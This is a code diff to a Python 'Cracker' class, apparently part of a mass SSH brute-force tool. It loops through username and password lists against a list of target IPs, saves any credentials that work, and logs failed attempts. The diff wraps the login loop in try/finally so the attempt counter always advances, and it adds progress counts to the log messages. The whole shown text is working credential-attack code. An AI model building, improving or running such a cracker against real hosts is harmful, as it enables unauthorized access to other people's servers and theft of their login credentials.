@@ -139,7 +139,7 @@ class Cracker:
         self.event = Event()
     
     def isRunning(self):
-        return int(self.tried) < len(self.sync_ips)
+        return int(self.tried) < len(self.sync_ips) + 1
 
     def save(self, target, port, username, password):
         self.cracked += 1
@@ -179,25 +179,23 @@ class Cracker:
         def crack(self, target, port=22):
             self.root.tps += 1
             
-            for username in self.root.userlist:
-                for password in self.root.passlist:
-                    try:
-                        self.sshClient.connect(target, port, username, password, timeout=1, banner_timeout=1.1)
-                        self.sshClient.close()
-                        self.root.save(target, port, username, password)
-                        return
+            try:
+                for username in self.root.userlist:
+                    for password in self.root.passlist:
+                        try:
+                            self.sshClient.connect(target, port, username, password, timeout=1, banner_timeout=1.1)
+                            self.sshClient.close()
+                            self.root.save(target, port, username, password)
+                            return
 
-                    except TimeoutError:
-                        Logger.fail("[%s] Timeout !" % target)
-                        return
-                    except AuthenticationException:
-                        Logger.fail("[%s] Invalid user or password %s:%s" % (target, username, password))
-                    except Exception as e:
-                        Logger.warning("[%s]" % target, e)
-                        return
-                            
+                        except AuthenticationException:
+                            Logger.fail("[%s] Invalid user or password %s:%s | %d/%d" % (target, username, password, int(self.root.tried), len(self.root.sync_ips)))
+                        except Exception as e:
+                            Logger.warning("[%s] %s | %d/%d" % (target, str(e) or repr(e), int(self.root.tried), len(self.root.sync_ips)))
+                            return
+            finally:
+                self.root.tried += 1
                         
-            self.root.tried += 1
 
 
 if __name__ == "__main__":
